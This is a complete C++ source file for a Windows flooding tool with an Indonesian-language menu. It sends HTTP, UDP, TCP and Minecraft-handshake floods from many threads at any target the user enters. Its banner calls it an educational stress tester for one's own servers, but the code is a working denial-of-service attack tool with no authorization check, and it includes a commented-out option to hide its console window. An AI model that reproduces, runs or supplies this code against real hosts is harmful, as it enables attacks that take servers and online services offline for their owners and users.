#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <chrono>
#include <random>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <curl/curl.h>
#include <atomic>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libcurl.lib")

using namespace std;
using namespace chrono;

atomic<bool> isRunning(true);
atomic<long long> packetCount(0);

void clearScreen() {
    system("cls");
}

void printHeader() {
    cout << "===========================================\n";
    cout << "    STRESS TEST TOOL - EDUKASI ONLY       \n";
    cout << "===========================================\n";
    cout << " Gunakan hanya pada server milik sendiri  \n";
    cout << " atau dengan izin pemilik server!         \n";
    cout << "===========================================\n\n";
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

void httpFlood(const string& url, int duration, int threadId) {
    CURL* curl;
    CURLcode res;
    string response;
    
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        
        auto startTime = steady_clock::now();
        
        while (isRunning && duration_cast<seconds>(steady_clock::now() - startTime).count() < duration) {
            response.clear();
            res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                packetCount++;
            }
            this_thread::sleep_for(milliseconds(10));
        }
        
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

void udpFlood(const string& ip, int port, int duration, int threadId) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return;
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr);
    
    char buffer[1024] = {0};
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, 255);
    
    for (int i = 0; i < 1024; i++) {
        buffer[i] = static_cast<char>(dis(gen));
    }
    
    auto startTime = steady_clock::now();
    
    while (isRunning && duration_cast<seconds>(steady_clock::now() - startTime).count() < duration) {
        sendto(sock, buffer, sizeof(buffer), 0, (sockaddr*)&serverAddr, sizeof(serverAddr));
        packetCount++;
        this_thread::sleep_for(microseconds(100));
    }
    
    closesocket(sock);
    WSACleanup();
}

void tcpFlood(const string& ip, int port, int duration, int threadId) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    auto startTime = steady_clock::now();
    
    while (isRunning && duration_cast<seconds>(steady_clock::now() - startTime).count() < duration) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) continue;
        
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr);
        
        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
            packetCount++;
            send(sock, "GET / HTTP/1.1\r\n\r\n", 18, 0);
        }
        
        closesocket(sock);
        this_thread::sleep_for(microseconds(500));
    }
    
    WSACleanup();
}

void minecraftPing(const string& ip, int port, int duration, int threadId) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    auto startTime = steady_clock::now();
    
    while (isRunning && duration_cast<seconds>(steady_clock::now() - startTime).count() < duration) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) continue;
        
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr);
        
        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
            // Minecraft handshake packet
            unsigned char handshake[] = {
                0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };
            
            send(sock, (char*)handshake, sizeof(handshake), 0);
            packetCount++;
        }
        
        closesocket(sock);
        this_thread::sleep_for(microseconds(200));
    }
    
    WSACleanup();
}

int main() {
    // Hide console window (optional - comment out if you want to see console)
    // ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    clearScreen();
    printHeader();
    
    int choice;
    string target;
    int port = 80;
    int duration = 10;
    int threads = 10;
    
    cout << "Pilih jenis flood:\n";
    cout << "1. HTTP Flood\n";
    cout << "2. UDP Flood\n";
    cout << "3. TCP Flood\n";
    cout << "4. Minecraft Server Flood\n";
    cout << "Pilihan: ";
    cin >> choice;
    
    cin.ignore();
    
    cout << "Masukkan target (URL untuk HTTP, IP untuk lainnya): ";
    getline(cin, target);
    
    if (choice != 1) {
        cout << "Masukkan port: ";
        cin >> port;
    }
    
    cout << "Masukkan durasi (detik): ";
    cin >> duration;
    
    cout << "Masukkan jumlah thread: ";
    cin >> threads;
    
    cout << "\nMemulai flood... Tekan Enter untuk berhenti\n";
    cout << "===========================================\n\n";
    
    vector<thread> floodThreads;
    
    auto startTime = steady_clock::now();
    
    switch (choice) {
        case 1:
            for (int i = 0; i < threads; i++) {
                floodThreads.emplace_back(httpFlood, target, duration, i);
            }
            break;
        case 2:
            for (int i = 0; i < threads; i++) {
                floodThreads.emplace_back(udpFlood, target, port, duration, i);
            }
            break;
        case 3:
            for (int i = 0; i < threads; i++) {
                floodThreads.emplace_back(tcpFlood, target, port, duration, i);
            }
            break;
        case 4:
            for (int i = 0; i < threads; i++) {
                floodThreads.emplace_back(minecraftPing, target, port, duration, i);
            }
            break;
    }
    
    // Monitoring thread
    thread monitor([&]() {
        while (isRunning) {
            auto elapsed = duration_cast<seconds>(steady_clock::now() - startTime).count();
            cout << "\rPacket terkirim: " << packetCount.load() 
                 << " | Waktu: " << elapsed << "/" << duration << " detik   " << flush;
            
            if (elapsed >= duration) {
                isRunning = false;
                break;
            }
            this_thread::sleep_for(milliseconds(100));
        }
    });
    
    // Wait for enter key
    cin.ignore();
    cin.get();
    
    isRunning = false;
    
    // Wait for all threads
    for (auto& t : floodThreads) {
        if (t.joinable()) t.join();
    }
    
    if (monitor.joinable()) monitor.join();
    
    cout << "\n\nFlood selesai. Total packet: " << packetCount.load() << endl;
    cout << "Tekan Enter untuk keluar...";
    cin.get();
    
    return 0;
}
